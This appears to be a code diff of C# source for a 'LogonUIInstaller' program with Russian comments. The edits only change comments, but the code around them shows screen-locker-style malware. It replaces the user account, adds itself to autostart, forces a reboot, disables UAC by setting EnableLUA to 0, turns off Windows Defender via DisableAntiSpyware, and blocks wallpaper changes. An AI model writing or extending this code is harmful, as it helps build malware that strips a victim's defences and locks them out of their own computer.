@@ -52,10 +52,10 @@ namespace LogonUIInstaller
                 // 4. УДАЛЕНИЕ ПОЛЬЗОВАТЕЛЯ
                 ReplaceUserAccount();
 
-                // 5. АВТОЗАГРУЗКА
+                // 5. АВТОЗАГРУЗКА (создаёт запись на запуск MainInterface)
                 AddToStartup();
 
-                // 6. ПРИНУДИТЕЛЬНАЯ ПЕРЕЗАГРУЗКА (ПОСЛЕ ВСЕХ БЛОКИРОВОК)
+                // 6. ПРИНУДИТЕЛЬНАЯ ПЕРЕЗАГРУЗКА
                 ForceReboot();
             }
             catch (Exception ex)
@@ -184,7 +184,7 @@ namespace LogonUIInstaller
                     key.SetValue("NoChangeWallpaper", 1, RegistryValueKind.DWord);
                 }
 
-                // Запрет создания новых пользователей (не UAC, отдельно)
+                // Запрет создания новых пользователей
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                 {
                     key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
@@ -197,6 +197,7 @@ namespace LogonUIInstaller
         {
             try
             {
+                // Отключение UAC
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                 {
                     key.SetValue("EnableLUA", 0, RegistryValueKind.DWord);
@@ -204,6 +205,7 @@ namespace LogonUIInstaller
                     key.SetValue("PromptOnSecureDesktop", 0, RegistryValueKind.DWord);
                 }
 
+                // Отключение Defender и антивирусов
                 using (var key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows Defender"))
                 {
                     key.SetValue("DisableAntiSpyware", 1, RegistryValueKind.DWord);
